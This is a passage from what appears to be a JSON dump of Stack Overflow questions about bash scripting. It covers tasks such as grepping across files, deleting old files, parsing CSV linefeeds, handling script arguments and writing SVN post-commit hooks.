in file B. (Does NOT have to be an exact match, so if file B had Blah and file A said Blah_blah, it'd be ok)</p>\n\n<p>I tried to do:</p>\n\n<pre><code>grep -f fileBcutdown fileA &gt; outputfile\n</code></pre>\n\n<p>EDIT: Ok I give up. I just force killed it.</p>\n\n<p>Is there a better way to do this? File A is 13.7MB and file B after cutting it down is 32.6MB for anyone that cares.</p>\n\n<p>EDIT: This is an example line in file A:</p>\n\n<pre><code>chr21 33025905 33031813 ENST00000449339.1 0 - 33031813 33031813 0 3 1835,294,104, 0,4341,5804,\n</code></pre>\n\n<p>example line from file B cut down:</p>\n\n<pre><code>ENST00000111111\n</code></pre>\n"},{"tags":["python","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":83,"score":-1,"question_id":12585971,"title":"Using a shell script to open Python Interpreter / execute code line by line?","body":"<p>In my shell script I'm trying to do something like</p>\n\n<pre><code>python\nsum = 2 + 2\necho $sum\n</code></pre>\n\n<p>By the script just launches the Python interpreter, waits for the interpreter to <code>exit()</code> and then fails in executing <code>sum = $(2+2)</code> since the Python environment closed. </p>\n\n<p>Thoughts? I know I could just write a Python script but I'm trying to see if I can do it this way. </p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12592443,"title":"getting positional arguments in bash","body":"<p>I have a bash script called foo with variable number of arguments, with the first one being a required one, i.e.:</p>\n\n<pre><code>foo a1 b2 b3 b4 ...\n</code></pre>\n\n<p>I understand that in bash $1 will get me argument a1, but is there a way to get all the rest of the arguments? $@ or $* seem to get me all the arguments including a1.</p>\n"},{"tags":["bash","sorting","messages"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12291185,"title":"BASH show past X days /var/log/messages","body":"<p>in BASH I can't think of a good way to do this but I only want to see the past 30 days of entries in /var/log/messages*.  The issue to me is how do I do that with just the Month and Day. For example:</p>\n\n<pre><code>Sep 2 14:26:13 &lt;SOME ENTRY&gt;\nSep 4 14:26:13 &lt;SOME ENTRY&gt; \nSep 9 14:26:13 &lt;SOME ENTRY&gt;\nSep 14 14:26:13 &lt;SOME ENTRY&gt;\netc..\n</code></pre>\n\n<p>Any ideas ? HELP! ha ha</p>\n"},{"tags":["bash","cron","lftp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12592274,"title":"LFTP Only large files","body":"<p>I was wondering if it was possible to transfer files via LFTP that are only greater than 10 MB that are within a certain set of directories.. So if I do something like:</p>\n\n<pre><code>lftp -u user,pass -e \"mirror --parallel=10 --reverse --delete --only-newer server1/public_html/downloads backups/public_html/downloads;quit\" ftp.ourhost.com\n</code></pre>\n\n<p>It will only grab files that are larger than 10 MB from downloads.</p>\n"},{"tags":["linux","bash","shell","vlc"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12231896,"title":"How to run rest of script after launching VLC?","body":"<p>After I launch VLC, the terminal seems locked up.  I can't even echo anything.  I've tried forking the launching of VLC but that seems to just crash the whole script as well.  <strong>Are there any other options?</strong>  I'm using cvlc by the way because I don't care about the user interface.  My other attempts are commented out with the hashtag:</p>\n\n<pre><code>echo \"launching VLC player...\"\n# cvlc v412://dev/video1:standard=NTSC:width=640:height=480 &amp;\n# cvlc v412://dev/video1:standard=NTSC:width=640:height=480&amp;\n# cvlc &amp; v412://dev/video1:standard=NTSC:width=640:height=480\ncvlc v412://dev/video1:standard=NTSC:width=640:height=480\n\necho \"can i see this in terminal?\"\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["apache","bash","background-process","executable-jar"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":11942523,"title":"Launching a JAR file using Apache as a background process","body":"<p>I have a data parsing utility in the form of a runnable JAR file. I also have an Apache server (Ubuntu 12.04) to which data files are uploaded. Is there anyway that I could launch said JAR file as a background process when a file is uploaded? (FYI: File access by multiple processes isn't a concern here; I've got file locking in place.)</p>\n\n<p>Related idea: if the above isn't possible, I could always launch the aforementioned JAR file from a bash script. However, I'm still not sure how to do that via Apache. I'm quite a novice at using it effectively.</p>\n\n<p><strong>Edit:</strong> Just noticed <a href=\"http://stackoverflow.com/questions/2540332/running-bash-scripts-in-php\">this potential php solution</a>. Apache folks: is this a good idea, or is there a better solution?</p>\n"},{"tags":["perl","bash","shell","csh","tcsh"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":683,"score":4,"question_id":5807395,"title":"Shell test to see whether a binary is in your path","body":"<p>In csh, tcsh, bash, perl (etc) you can do tests on par with (not necessarily with the same syntax):</p>\n\n<pre><code>test -e PATH; # Does PATH exist\ntest -f PATH; # Is PATH a file\ntest -d PATH; # is PATh a directory\n...\n</code></pre>\n\n<p>Does a similar construct exist for checking whether a binary is in your path? (and perhaps whether an alias, or even a built-in exist)</p>\n\n<p>Obviously this can be done with something of the form:</p>\n\n<pre><code>#!/usr/bin/env bash\nC=COMMAND;\ntest $(which $C) -o $(alias $C) &amp;&amp; \"$C exists\"\n</code></pre>\n\n<p>or something similar in other shells/script languages.</p>\n\n<p>The question isn't whether it's possible to test for the existence of a program, command, etc.  The question is whether a built-in test exists or not.</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":11876657,"title":"Create files based on user input","body":"<p>I have a bash script that asks the user for 3 numbers (example, 123).</p>\n\n<p>I'm stuck on how to separate these numbers in order to create file1, file2, file3, I also have to determine if they are unique.</p>\n\n<p>Any help would be appreciated.</p>\n\n<p>I can post my bash script if needed.</p>\n\n<pre><code>! /bin/bash\nclear\necho -n \"Enter three digits number: \"\nread number\n\necho $number | grep \"^[0-9][0-9][0-9]$\"\nif [ \"$?\" -eq 1 ] \nthen\n   echo \"Error!! Please enter only 3 numbers.\"\n   exit 1\nfi\n\nif [ -d ~/a2/numbers ]\nthen\n   rm -r ~/a2/numbers\nfi\nmkdir ~/a2/numbers\n\nif [ ! -e ~/a2/products ]\nthen\n   echo \"Error the file \\'products\\'! does not exist\"\n   exit 1\nfi\necho ' '\ncat ~/a2/products\n\necho ' '\ncut -f2 -d',' ~/a2/products &gt; ~/a2/names\ncat ~/a2/names\n\necho \"I have $(cat ~/a2/names | wc -l) products in my product file\"\necho ' '\n</code></pre>\n"},{"tags":["bash","logging","syslog"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12588842,"title":"How to log messages to a log file in a specific path from a bash script","body":"<p>How do you log messages to a log file in a specific path from a bash script?</p>\n\n<p>A naive implementation would be commands like:</p>\n\n<pre><code>echo My message &gt;&gt;/my/custom/path/to/my_script.log\n</code></pre>\n\n<p>But this probably has many disadvantages (no log rotation for example).\nI could use the 'logger' command, but it does not support logs in custom paths as far as I know and is not easy to configure if you have lots of bash scripts that could use a custom log file.</p>\n\n<p>In a scripting language like Ruby all this is quite easy: <a href=\"https://github.com/rudionrails/yell/wiki/101-the-datefile-adapter\" rel=\"nofollow\">https://github.com/rudionrails/yell/wiki/101-the-datefile-adapter</a>\nI could also make my own logger command based on this ruby library and call it from my bash scripts, but I guess there is already a well known solution that provides similar behavior for shell scripts?</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":12,"up_vote_count":29,"down_vote_count":0,"view_count":15341,"score":29,"question_id":249578,"title":"How to delete files older than X hours","body":"<p>I'm writing a bash script that needs to delete old files.</p>\n\n<p>It's currently implemented using :</p>\n\n<pre><code>find $LOCATION -name $REQUIRED_FILES -type f -mtime +1 -delete\n</code></pre>\n\n<p>This will delete of the files older than 1 day.</p>\n\n<p>However, what if I need a finer resolution that 1 day, say like 6 hours old? Is there a nice clean way to do it, like there is using find and -mtime?</p>\n"},{"tags":["linux","bash","find","xargs","cp"],"answer_count":4,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":77,"score":7,"question_id":12589105,"title":"How do I use find to copy and remove extensions keeping the same subdirectory structure","body":"<p>I'm trying to copy all the files from one directory to another, removing all file extensions at the same time.</p>\n\n<pre><code>From directory 0001:\n 0001/a/1.jpg\n 0001/b/2.txt\n\nTo directory 0002:\n 0002/a/1\n 0002/b/2\n</code></pre>\n\n<p>I've tried several find ... | xargs c...p with no luck.</p>\n"},{"tags":["bash","unix","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":47,"score":-2,"question_id":11841596,"title":"How to make a Bash here doc that takes unlimited comments and prints to screen?","body":"<p>I'm having trouble implementing a here doc that allows the user to enter unlimited lines of comments into the terminal and that would finish when the user types the limit string. After entering the limit string, all the lines the user entered will be echoed back onto the screen. I'm not sure how to implement this, as I don't think I'm able to use a loop inside a here doc. Help would be greatly appreciated.</p>\n"},{"tags":["bash","directory","arguments","compare"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":8321168,"title":"Simple bash script to determine if a file is in a directory","body":"<p>I'm trying to figure out in <code>bash</code> how to simply show that an argument which is a file is in another argument which is a directory, and then remove the file if it is.  I was thinking about setting a variable to <code>$(dirname $file)</code> and then comparing it to the directory name, but I'm not sure if that is the right direction to go in for this question. or would I do a <code>ls</code> of the directory and somehow match that to the file?</p>\n"},{"tags":["linux","file","bash","search"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12589201,"title":"Look for a location of a file in two places bash linux","body":"<p>I'm looking to do this in one command in bash:</p>\n\n<pre><code>[[ -f ./${SQLITE} ] || [ -f /tmp/${SQLITE} ]] \n</code></pre>\n\n<p>Not sure how to do it  yet ....  look for a file in two places... in one command.</p>\n"},{"tags":["bash","sed","awk","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12587576,"title":"Bash - Identify files not referenced by other files","body":"<p>I have a website that runs off an OpenWRT router.  I'd like to optimize the site by removing an files that aren't being used.  Here is my directory structure...</p>\n\n<pre><code> /www/images\n /www/js\n /www/styles\n /www/otherSubDirectories  &lt;--- not really named that\n</code></pre>\n\n<p>I'm mostly concerned about identifying images that are not used because those take the most space.  But it would also be nice to identify style sheets and javascript files that are not being used.  So, is there a way I can search /www and all sub directories and files and print a list of files in /www/images, /www/js, and /www/styles that are not referenced by any other files?</p>\n\n<p>When I'm looking for files that contain a specific string I use this:</p>\n\n<pre><code> find . | xargs grep -Hn 'myImage.jpg' \n</code></pre>\n\n<p>That would tell me all files that reference the image.  Maybe some variation of that?</p>\n\n<p>Any help would be appreciated!</p>\n\n<p>EV</p>\n"},{"tags":["html","regex","bash","script","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":12439711,"title":"Bash script to insert data from file at points specified by string","body":"<p>I'd like to build a bash (or something else) script that when run will search it's own directory (recursively) for files with the html extension, and change in them all the code between specific tags with the content from another (specific) file.</p>\n\n<p>I'm doing this because I need to have a navigation across all pages <strong>but</strong> it has small changes in each one that will be taken care of later, so this script would help me to just get the base first, so I can then alter the rest.</p>\n\n<p>I'm specifically looking to do this with a script, locally, not to replace it with javascript or php code in the html.</p>\n"},{"tags":["bash","r"],"answer_count":7,"favorite_count":9,"up_vote_count":27,"down_vote_count":0,"view_count":21653,"score":27,"question_id":750786,"title":"What's the best way to use R scripts on the command line?","body":"<p>It's very convenient to have R scripts for doing simple plots from the command line.  However, running R from bash scripts is not convenient at all.  The ideal might be something like</p>\n\n<pre><code>#!/path/to/R\n...\n</code></pre>\n\n<p>or</p>\n\n<pre><code>#!/usr/bin/env R\n...\n</code></pre>\n\n<p>but I haven't been able to make either of those work.</p>\n\n<p>Another option is keeping the scripts purely in R, e.g. <code>script.R</code>, and invoking it with <code>R --file=script.R</code> or similar.  However, occasionally a script will rely on obscure command line switches at which point part of the code exists outside the script.  Example: sneaking things into R from bash via a local .Rprofile, the desired switches are then everything <code>--vanilla</code> implies except <code>--no-init-file</code>.</p>\n\n<p>Another option is a bash script to store the R flags and be painlessly executable, which then calls the R script.  The problem is that this means a single program just got split into two files which now have to be keep in sync, transferred to new machines together, etc.</p>\n\n<p>The option I currently despise least is embedding the R in a bash script:</p>\n\n<pre><code>#!/bin/bash\n... # usage message to catch bad input without invoking R\n... # any bash pre-processing of input\n... # etc\nR --random-flags &lt;&lt;RSCRIPT\n# R code goes here\nRSCRIPT\n</code></pre>\n\n<p>Everything's in a single file.  It's executable and easily handles arguments.  The problem is that combining bash and R like this pretty much eliminates the possibility of any IDE not failing on one or the other, and makes my heart hurt real bad.</p>\n\n<p>Is there some better way I'm missing?</p>\n"},{"tags":["linux","string","bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12576982,"title":"Pass a Multiline,Quoted string as a single command line argument in unix?","body":"<p>I just need to pass any HTML content as a command line argument which includes characters like ', \" , ` and what not? How can I pass this as a single argument in unix?</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12585089,"title":"terminate infinite loop initiated in remote server when exiting bash script","body":"<p>Script which executes commands in infinite loop in background</p>\n\n<pre><code>&lt;SOMETHING ELSE AT START OF SCRIPT&gt;\n\ncmd='while true;\ndo\n    ps aux | head;\n    sleep 1;\ndone &gt; $FILE'    \n\nssh root@$SERVER $cmd &amp;\n...\n...\n&lt;SOME OTHER TASKS&gt;\n...\n...\n( at the end of this script, how to kill the above snippet executing in remote server)\n[ kindly note i dont want to wait as the while loop is infinite ]\n</code></pre>\n\n<p>Read and tried some posts from stackoverflow, but could not find exact solution for this problem.</p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12582103,"title":"Extract part of a filename shell script","body":"<p>In bash I would like to extract part of many filenames and save that output to another file. </p>\n\n<p>The files are formatted as coffee_{SOME NUMBERS I WANT}.freqdist.</p>\n\n<pre><code>#!/bin/sh\nfor f in $(find . -name 'coffee*.freqdist)\n</code></pre>\n\n<p>That code will find all the coffee_{SOME NUMBERS I WANT}.freqdist file. Now, how do I make an array containing just {SOME NUMBERS I WANT} and write that to file?</p>\n\n<p>I know that to write to file one would end the line with the following.</p>\n\n<pre><code>  &gt; log.txt\n</code></pre>\n\n<p>I'm missing the middle part though of how to filter the list of filenames.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12585584,"title":"How do I git mv files with ext *.css.scss to *.scss using bash?","body":"<p>I've run into this a few times and I'm curious about automating it. If I want to move a bunch of files matching a pattern to a slightly different pattern, how would I do it?</p>\n\n<p>More specifically, If I want to <code>git mv</code> the following files</p>\n\n<pre><code>fileA.css.scss\nfileB.css.scss\n...\n</code></pre>\n\n<p>to</p>\n\n<pre><code>fileA.scss\nfileA.scss\n...\n</code></pre>\n\n<p>How would you do it?</p>\n"},{"tags":["linux","osx","bash","netbeans","multiplatform"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12584871,"title":"Trouble with multiplatform (Windows, MacOSX, Linux) application using readline","body":"<p>I'm writing a multiplatform (Windows, Linux and MacOSX) app in C using Netbeans IDE.</p>\n\n<p>It is shell based (bash) and i'm using readline and history for data input.</p>\n\n<p>Additionaly, i want to overwrite shortcut keys (Ctrl + A, Ctrl + B, ...), so i used rl_bind_key function.</p>\n\n<p>rl_bind_key works properly in Windows, but doesn't work in Linux and MacOSX, it always returns -1.</p>\n\n<p>Another trouble i have is that inside Netbeans (shell integrated to IDE), everything runs OK, but outside Netbeans Shell my application looks incomplete. I think that these behavior is due to shell configutation, how can I export configuration from one shell to another..?</p>\n"},{"tags":["osx","bash","applescript","finder","automator"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":4636,"score":4,"question_id":4215287,"title":"Adding a script to MacOS finder contextual menu","body":"<p>I want to add an option to the finder context menu that calls <code>hg add %1</code> with %1 being the full path of the selected file in finder.<br>\nOf course there are more useful cases I can think of, to add to the context menu.<br>\nIs there a simple way to do that which doesn't involve installing any 3rd party software or coding in a compiled language and building binary plugins?<br>\nLike creating a script with the script editor and dropping it in <code>/Library/Contextual Menu Items/</code> ?</p>\n"},{"tags":["bash","csv","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12574911,"title":"Remove linefeed from csv preserving rows","body":"<p>I have a CSV that was exported, some lines have a linefeed (ASCII 012) in the middle of a record. I need to replace this with a space, but preserve the new line for each record to load it.</p>\n\n<p>Most of the lines are fine, however a good few have this:</p>\n\n<p>Input:</p>\n\n<pre><code>10 , ,\"2007-07-30 13.26.21.598000\" ,1922 ,0 , , , ,\"Special Needs List Rows updated :\nRow 1 : Instruction: other :Comment: pump runs all of the water for the insd's home\" ,10003 ,524 ,\"cc:2023\" , , ,2023 , , ,\"CCR\" ,\"INSERT\" ,\"2011-12-03 01.25.39.759555\" ,\"2011-12-03 01.25.39.759555\"\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>10 , ,\"2007-07-30 13.26.21.598000\" ,1922 ,0 , , , ,\"Special Needs List Rows updated :Row 1 : Instruction: other :Comment: pump runs all of the water for the insd's home\" ,10003 ,524 ,\"cc:2023\" , , ,2023 , , ,\"CCR\" ,\"INSERT\" ,\"2011-12-03 01.25.39.759555\" ,\"2011-12-03 01.25.39.759555\"\n</code></pre>\n\n<p>I have been looking into Awk but cannot really make sense of how to preserve the actual row.</p>\n\n<p>Another Example:</p>\n\n<p>Input:</p>\n\n<pre><code>9~~\"2007-08-01 16.14.45.099000\"~2215~0~~~~\"Exposure closed (Unnecessary) : Garage door working\nClaim Withdrawn\"~~701~\"cc:6007\"~~564~6007~~~\"CCR\"~\"INSERT\"~\"2011-12-03 01.25.39.759555\"~\"2011-12-03 01.25.39.759555\"\n4~~\"2007-08-01 16.14.49.333000\"~1923~0~~~~\"Assigned to user Leanne Hamshere in group GIO Home Processing (Team 3)\"~~912~\"cc:6008\"~~~6008~~~\"CCR\"~\"INSERT\"~\"2011-12-03 01.25.39.759555\"~\"2011-12-03 01.25.39.759555\"\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>9~~\"2007-08-01 16.14.45.099000\"~2215~0~~~~\"Exposure closed (Unnecessary) : Garage door working Claim Withdrawn\"~~701~\"cc:6007\"~~564~6007~~~\"CCR\"~\"INSERT\"~\"2011-12-03 01.25.39.759555\"~\"2011-12-03 01.25.39.759555\"\n4~~\"2007-08-01 16.14.49.333000\"~1923~0~~~~\"Assigned to user Leanne Hamshere in group GIO Home Processing (Team 3)\"~~912~\"cc:6008\"~~~6008~~~\"CCR\"~\"INSERT\"~\"2011-12-03 01.25.39.759555\"~\"2011-12-03 01.25.39.759555\"\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12582410,"title":"Read into variables from a variable","body":"<p>How can you \"read\" into variables using IFS and a variable?</p>\n\n<p>I am trying to loop over some data paired by a pipe to be split and worked on.  The error I am getting is <code>read: 'site|database': not a valid identifier</code></p>\n\n<pre><code>SITES=\"abc|abc xyz|asdf\"\nfor site in $SITES;\ndo\n  IFS=\"|\" read domain database &lt;&lt;&lt; echo $site; # es no bueno mi amigo\n  echo \"Site: $domain \\t\\t\\t Database: $database\";\ndone;\n</code></pre>\n\n<p>Am I just doing this the hard way?  I am not a native Basher. ;)</p>\n"},{"tags":["linux","bash","unix","shell"],"answer_count":9,"favorite_count":9,"up_vote_count":20,"down_vote_count":0,"view_count":13617,"score":20,"question_id":284662,"title":"How do you normalize a file path in Bash?","body":"<p>I want to transform <code>/foo/bar/..</code> to <code>/foo</code></p>\n\n<p>Is there a bash command which does this?</p>\n\n<hr>\n\n<p>Edit: in my practical case, the directory does exist.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12580872,"title":"BASH : Feeding file to while loop","body":"<p>I have next code with while loop in my sctipt :</p>\n\n<pre><code>TMP_FILE=`mktemp`\nsome_script.sh | grep aa &gt; $TMP_FILE \nwhile read i\n   do\n      echo $i\n      number=`ssh somehost cat somefile | grep 11 `  \n      echo $number\n   done &lt; $TMP_FILE\n</code></pre>\n\n<p>Contents of TMP_FILE looks like :</p>\n\n<pre><code>hostname1 AB_CDEF_JH10\nhostname2 BC_DEF_JK19\n...\n</code></pre>\n\n<p>In this case, script works correctly only  one loop pass, picking up first line from TMP_FILE. After that , script exit. Is there any idea why it do not want to process other lines except firs one ?</p>\n"},{"tags":["xcode","bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12579530,"title":"How to auto increment build version in Xcode only if the user name is XXX?","body":"<p>How to auto increment build version in Xcode only if the user name is XXX?</p>\n\n<p>I tried:</p>\n\n<pre><code> #!/bin/bash\n    if [$USER == \"XXX\"];then\n    buildNumber=$(/usr/libexec/PlistBuddy -c \"Print CFBundleVersion\" \"$INFOPLIST_FILE\")\n     buildNumber=$(($buildNumber + 1))\n    /usr/libexec/PlistBuddy -c \"Set :CFBundleVersion $buildNumber\" \"$INFOPLIST_FILE\"\n   fi\n</code></pre>\n\n<p>But no success.. any ideas?</p>\n"},{"tags":["linux","bash","date","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1877,"score":2,"question_id":2899110,"title":"Compare time using date command","body":"<p>Say I want a certain block of a bash script executed only if it is between 8 am (8:00) and 5 pm (17:00), and do nothing otherwise. The script is running continuously.</p>\n\n<p>So far I am using the <code>date</code> command.</p>\n\n<p>How to use it to compare it to the time range?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12578747,"title":"printing the ampersand","body":"<p>I have a bash script that takes a url with variables and writes it to a file, problem is the ampersand is interfering and being interpreted as a command / control character.</p>\n\n<p>In this situation the string cannot be escaped BEFORE being passed to the script and I have yet to find any way to do this. </p>\n\n<pre><code>if [ $1 ] ; then\n    url=$1\n    printf %q \"$url\" &gt; \"/somepath/somefile\"\nfi\n</code></pre>\n\n<p>with $1 being for example localhost?x=1&amp;y=2&amp;z=3</p>\n\n<p>What get's printed is only the part before the first ampersand: \"localhost?x=1\"</p>\n\n<p>I have also tried echo instead of printf but it's exactly the same ??</p>\n"},{"tags":["git","bash","batch","npm"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":83,"score":1,"question_id":12574689,"title":"How would you convert this bash alias to a (Windows) doskey alias?","body":"<p>I'm porting some bash aliases to <code>doskey</code> batch commands, and I'm having an incredibly difficult time with one in particular.  Anyone think they can help?</p>\n\n<p>The bash alias is:</p>\n\n\n\n<pre><code>alias gitrel='if [ -n \"$(npm version patch)\" ]; then git push &amp;&amp; git push --tags; fi'\n</code></pre>\n\n<p><strong>Question(s)</strong>:</p>\n\n<ul>\n<li>How to run and get the returned value from <code>npm</code> version patch?,</li>\n<li>Or how to do the control flow logic within a <code>doskey</code> command?</li>\n</ul>\n"},{"tags":["bash","svn","post-commit"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12566618,"title":"How can I force SVN post-commit to send messages to client?","body":"<p>I am writing a post-commit hook that publishes certain files to a webserver if they are changed.</p>\n\n<p>I want to make it clear to the client / user what happens after he commited.</p>\n\n<p>Thats why I added echo commands returning information to the client.</p>\n\n<p>I read this post : <a href=\"http://stackoverflow.com/questions/8424670/svn-post-commit-hook-sending-a-message-back-to-client\">SVN post-commit hook sending a message back to client</a> which says that post commit hooks can only return information if I use exit 1.</p>\n\n<p>This works great but it confuses clients because this message appears:</p>\n\n<p><code>Warning: post-commit hook failed (exit code 1) with output:</code></p>\n\n<p>Is there a way to circumvent this output?</p>\n\n<p>If it helps, my script so far:</p>\n\n<pre><code>echo \"Everything OK. Checking if publishing dir was changed.\" &gt;&amp;2\n\nsvn status /var/www/dev/test/public/projektbereich1/http | grep [AMCDG]\nif [ $? -eq 0 ]  ; then\n    echo \"Dir has changed. Publishing files.\" &gt;&amp;2\ncp -R /var/www/dev/test/public/projektbereich1/http /var/www/public/\n\nelse\n    echo \"Dir has not changed. Webserver does not get updated.\" &gt;&amp;2\nfi\n\nexit 1\n</code></pre>\n"},{"tags":["bash","limit","ack","args"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":10568806,"title":"Bash - ack - limit length of matched line","body":"<p>Is there a way to limit the length of the line matched by ack? If ack matches, for example, a minified javascript file, the line it prints out can be very large. I still want it to show the highlighted match, but ideally with the line cut before and after the match with elipses: <code>\"... stuff match stuff ...\"</code>. Not seeing anything conclusive in <a href=\"http://betterthangrep.com/documentation/\" rel=\"nofollow\">the ack docs</a>.</p>\n\n<p>I tried digging into it with something like</p>\n\n<pre><code>ack pattern | awk '{print substr($0,1,200) }'\n</code></pre>\n\n<p>but <code>awk</code> seems to be stripping coloring and formatting, which is undesired. Also I tried (bear with me for a second):</p>\n\n<pre><code>ack pattern | ack pattern\n</code></pre>\n\n<p>To see if I could re-ack on each line and chop it up or something, but that has the same formatting problem. Piping ack output removes the line breaks apparently?</p>\n\n<p>Edited based on comment:</p>\n\n<p>Maybe it will help to explain the main reason why I want this. I use ack.vim to search in my project. I often want to ack through my javascript files to find a word, like \"cookie\". We have jQuery and other minified libraries versioned in our code, so they show up in the ack results. Since those files are minified, there are very few line breaks, and it shows a gigantic line in the split window which I have to scroll past. I almost never care about that match so it's annoying to take up so much space. I could just add those minified file names to my ackrc to ignore but I'd prefer not to have to add a new file name every time we add a minified library. There is <a href=\"https://github.com/mileszs/ack.vim/issues/30\" rel=\"nofollow\">an open issue</a> on the ack.vim repo about this. I want to know if it's possible to do purely through bash-fu.</p>\n"},{"tags":["php","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":52,"score":0,"question_id":12577391,"title":"Is there a similar to bash set ±x directive in php?","body":"<p><code>set -x</code> makes the output more clarified, i.e. you can see ‘under the cover’, values substitution and what is actually done. <code>set +x</code> brings the default behavior back.</p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12577190,"title":"How to pass variable's values in multiline string shellscript","body":"<p>I have a variable called <code>instdir</code> that has the current directory. I need to pass its value to a multiline string that will be written to a file. As <code>instdir</code> finishes with a slash I <strong>can't</strong> do anything like this:</p>\n\n<pre><code>cat &gt; test &lt;&lt;EOF\n  $instdir/final/path/to/file\nEOF\n</code></pre>\n\n<p>But If I use <code>$instdirfinal</code> instead, it won't recognize the real <code>instdir</code>'s value. What I suppose to do?</p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12576700,"title":"Shellscript backslashed and spaced parameter","body":"<p>So, what I'm trying to do is if the user didn't pass a path as argument to script, the script shall use the current directory. If a path is passed use it instead.</p>\n\n<pre><code>instdir=\"$(pwd)/\"\nif [ -n \"$1\" ] ; then\n  instdir=\"$1\"\nfi\ncd $instdir\n</code></pre>\n\n<p>Errors</p>\n\n<p><code>./script.sh /path/to/a\\ folder/</code></p>\n\n<p><em>outputs</em>: <code>cd: /path/to/a: File or folder not found</code></p>\n\n<p><code>./script.sh \"/path/to/a\\ folder/\"</code></p>\n\n<p><em>outputs</em>: <code>cd: /path/to/a\\: File or folder not found</code></p>\n\n<p>What am I doing wrong here?</p>\n"},{"tags":["bash","vim","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":12575873,"title":"Delete line if same line in another file matches a pattern","body":"<p>I have 2 files,fileA and fileB.</p>\n\n<p>fileA contains:</p>\n\n<pre><code>71\n32\n23\n10\n...\n</code></pre>\n\n<p>and fileB contains:</p>\n\n<pre><code>ok\nno\nno\nok\n...\n</code></pre>\n\n<p>What I want to do is deleting lines in fileA if the same line in fileB matches 'no'.\nSo the resulting fileA would like:</p>\n\n<pre><code>71\n10\n...\n</code></pre>\n\n<p>Any command or bash script or vim can do this? </p>\n"},{"tags":["arrays","bash"],"answer_count":1,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":4410,"score":5,"question_id":9736202,"title":"Bash: Read file line into array","body":"<p>I would like to read a file into a script, line by line. Each line in the file is multiple values seperated by a tab, I'd like to read each line into an array. </p>\n\n<p>Typical bash \"read file by line\" example;</p>\n\n<pre><code>while read line\ndo\necho $line;\ndone &lt; \"myfile\"\n</code></pre>\n\n<p>For me though, myfile looks like this (tab separated values);</p>\n\n<pre><code>value1 value2 value3\nvalue4 value5 value6\n</code></pre>\n\n<p>On each iteration of the loop, I'd like each line to go into an array so I can</p>\n\n<pre><code>while read line into myArray\ndo\n echo myArray[0]\n echo myArray[1]\n echo myArray[2]\ndone &lt; \"myfile\"\n</code></pre>\n\n<p>This would print the following on the first loop iteration;</p>\n\n<pre><code>value1\nvalue2\nvalue3\n</code></pre>\n\n<p>Then on the second iteration it would 